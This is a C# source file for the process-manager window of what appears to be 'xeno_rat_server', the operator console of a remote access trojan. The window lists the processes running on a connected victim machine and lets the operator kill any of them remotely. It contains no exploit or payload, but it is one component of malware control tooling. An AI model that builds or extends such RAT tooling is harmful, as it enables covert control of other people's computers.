using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace xeno_rat_server.Forms
{
    public partial class ProcessManager : Form
    {
        Node client;
        bool paused = false;
        public ProcessManager(Node _client)
        {
            client = _client;
            InitializeComponent();
            _ = Task.Run(async () => await RecvThread());
        }

        /// <summary>
        /// Asynchronously receives data from the client and processes it.
        /// </summary>
        /// <remarks>
        /// This method continuously receives data from the connected client using asynchronous operations.
        /// If the received data is null and the object is not disposed, it closes the connection and returns.
        /// If the method is paused, it continues to the next iteration without processing the received data.
        /// The received data is deserialized into a list of ProcessNode objects and then displayed as a process tree.
        /// </remarks>
        public async Task RecvThread()
        {
            while (client.Connected())
            {
                byte[] data = await client.ReceiveAsync();
                if (data == null)
                {
                    if (!this.IsDisposed)
                    {
                        this.Invoke((MethodInvoker)(() =>
                        {
                            this.Close();
                        }));
                    }
                    return;
                }
                if (paused) continue;
                List<ProcessNode> b = DeserializeProcessList(data);
                DisplayProcessTree(b);
            }
        }

        /// <summary>
        /// Populates the tree view with the process node and its children.
        /// </summary>
        /// <param name="node">The process node to be added to the tree view.</param>
        /// <param name="parentNode">The parent node under which the process node should be added.</param>
        /// <remarks>
        /// This method populates the tree view with the given process node and its children.
        /// It creates a tree node for the process node, including its name, PID, file path, and file description.
        /// If a parent node is provided, the tree node for the process node is added as a child to the parent node.
        /// If no parent node is provided, the tree node for the process node is added to the root of the tree view.
        /// The method then recursively populates the tree view with the children of the process node.
        /// Finally, if no parent node is provided, the tree view is updated to reflect the changes.
        /// </remarks>
        private void PopulateTreeView(ProcessNode node, TreeNode parentNode)
        {
            TreeNode treeNode = new TreeNode($"{node.Name} ({node.PID}): {node.FilePath} ({node.FileDescription})");
            treeNode.Tag = node;


            if (parentNode != null)
            {
                treeView1.Invoke((Action)(() =>
                {
                    parentNode.Nodes.Add(treeNode);
                }));
            }
            else
            {
                treeView1.Invoke((Action)(() =>
                {
                    treeView1.BeginUpdate();
                    treeView1.Nodes.Add(treeNode);
                }));
            }

            foreach (var childNode in node.Children)
            {
                PopulateTreeView(childNode, treeNode);
            }

            if (parentNode == null)
            {
                treeView1.Invoke((Action)(() =>
                {
                    treeView1.EndUpdate();
                }));
            }
        }

        /// <summary>
        /// Displays the process tree in a tree view control.
        /// </summary>
        /// <param name="processList">The list of process nodes to be displayed.</param>
        /// <remarks>
        /// This method updates the tree view control by clearing its nodes, then populating it with the process tree represented by the input list of process nodes.
        /// The process tree is represented as a hierarchical structure, where each node may have child nodes.
        /// The method uses the BeginUpdate and EndUpdate methods to optimize the performance of the tree view control when updating its nodes.
        /// </remarks>
        private void DisplayProcessTree(List<ProcessNode> processList)
        {
            treeView1.Invoke((Action)(() =>
            {
                treeView1.BeginUpdate();
                treeView1.Nodes.Clear();
            }));

            foreach (var rootNode in processList)
            {
                PopulateTreeView(rootNode, null);
            }

            treeView1.Invoke((Action)(() =>
            {
                treeView1.EndUpdate();
            }));
        }

        /// <summary>
        /// Deserializes the byte array into a list of ProcessNode objects.
        /// </summary>
        /// <param name="serializedData">The byte array containing the serialized process data.</param>
        /// <returns>A list of ProcessNode objects deserialized from the <paramref name="serializedData"/>.</returns>
        private static List<ProcessNode> DeserializeProcessList(byte[] serializedData)
        {
            List<ProcessNode> processList = new List<ProcessNode>();

            using (MemoryStream memoryStream = new MemoryStream(serializedData))
            {
                using (BinaryReader reader = new BinaryReader(memoryStream))
                {
                    // Deserialize the number of processes
                    int processCount = reader.ReadInt32();

                    // Deserialize each process node
                    for (int i = 0; i < processCount; i++)
                    {
                        ProcessNode processNode = DeserializeProcessNode(reader);
                        processList.Add(processNode);
                    }
                }
            }

            return processList;
        }

        /// <summary>
        /// Deserializes a ProcessNode from the provided BinaryReader and returns the deserialized ProcessNode.
        /// </summary>
        /// <param name="reader">The BinaryReader used for deserialization.</param>
        /// <returns>The deserialized ProcessNode.</returns>
        /// <remarks>
        /// This method deserializes a ProcessNode from the provided BinaryReader. It reads the process ID, child count, file path, file description, and name from the reader, and then recursively deserializes child nodes if present.
        /// The deserialized ProcessNode is returned with its properties set based on the data read from the BinaryReader.
        /// </remarks>
        private static ProcessNode DeserializeProcessNode(BinaryReader reader)
        {
            int pid = reader.ReadInt32();
            int childCount = reader.ReadInt32();
            string filePath = reader.ReadString();
            string fileDescription = reader.ReadString();
            string name = reader.ReadString();
            ProcessNode processNode = new ProcessNode(filePath)
            {
                PID = pid,
                Name = name,
                FileDescription = fileDescription,
                Children = new List<ProcessNode>()
            };

            for (int i = 0; i < childCount; i++)
            {
                ProcessNode child = DeserializeProcessNode(reader);
                processNode.Children.Add(child);
            }

            return processNode;
        }

        /// <summary>
        /// Sends a kill command to the specified process ID.
        /// </summary>
        /// <param name="pid">The process ID to be killed.</param>
        /// <exception cref="Exception">Thrown when an error occurs while sending the kill command.</exception>
        private async void killPid(int pid)
        {
            try 
            {
                await client.SendAsync(client.sock.IntToBytes(pid));
                MessageBox.Show("sent the kill command");
            } 
            catch 
            {
                MessageBox.Show("error sending the kill command");
            }
        }

        /// <summary>
        /// Handles the mouse click event on a tree node, and displays a context menu to kill the associated process if the right mouse button is clicked.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A TreeNodeMouseClickEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the right mouse button is clicked, and if so, it creates a context menu with an option to kill the process associated with the clicked tree node.
        /// If the process node is successfully retrieved from the clicked tree node, a context menu is displayed with an option to kill the associated process.
        /// When the context menu item is clicked, it triggers the killPid method with the process ID as a parameter to terminate the process.
        /// If an exception occurs during the process node retrieval or context menu creation, a message box displaying "something went wrong..." is shown.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the retrieval of the process node or context menu creation.</exception>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                try 
                {
                    ProcessNode procnode = ((ProcessNode)e.Node.Tag);
                    ContextMenuStrip PopupMenu = new ContextMenuStrip();
                    PopupMenu.Items.Add("Kill " + procnode.Name);
                    PopupMenu.ItemClicked += new ToolStripItemClickedEventHandler((object _, ToolStripItemClickedEventArgs __) => killPid(procnode.PID));
                    PopupMenu.Show(Cursor.Position);
                } 
                catch 
                {
                    MessageBox.Show("something went wrong...");
                }
            }
        }

        /// <summary>
        /// Event handler for the load event of the ProcessManager form.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An <see cref="EventArgs"/> that contains the event data.</param>
        /// <remarks>
        /// This method is called when the ProcessManager form is loaded. It can be used to perform any initialization or setup tasks for the form.
        /// </remarks>
        private void ProcessManager_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the Load event of the ProcessManager form.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        private void ProcessManager_Load_1(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the Load event of the ProcessManager form.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method is called when the ProcessManager form is loaded. It can be used to perform any necessary initialization or setup for the form.
        /// </remarks>
        private void ProcessManager_Load_2(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the Load event of the ProcessManager form.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method is triggered when the ProcessManager form is loaded. It does not perform any specific actions at this time.
        /// </remarks>
        private void ProcessManager_Load_3(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the AfterSelect event of the treeView1 control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A TreeViewEventArgs that contains the event data.</param>
        /// <remarks>
        /// This event is raised when a tree node is selected. It occurs after the selected node has changed and the treeView1 control has been updated.
        /// </remarks>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {

        }

        /// <summary>
        /// Toggles the pause state and sends a corresponding signal to the client.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method toggles the pause state of the application. If the application is currently not paused, it sends a signal to the client to pause, and vice versa.
        /// The method uses the <paramref name="client"/> to send a corresponding byte signal to the client.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            if (!paused)
            {
                paused = true;
                await client.SendAsync(new byte[] { (byte)1 });
                button1.Text = "Unpause";
            }
            else 
            {
                paused = false;
                await client.SendAsync(new byte[] { (byte)0 });
                button1.Text = "Pause";
            }
            
        }
    }
    class ProcessNode
    {
        public string FilePath { get; }
        public int PID { set;  get; }
        public string FileDescription { get; set; }
        public string Name { set; get; }
        public List<ProcessNode> Children { get; set; }

        public ProcessNode(string filePath)
        {
            FilePath = filePath;
            if (filePath == "") 
            {
                FilePath = "Unkown Path";
            }
        }
    }
}
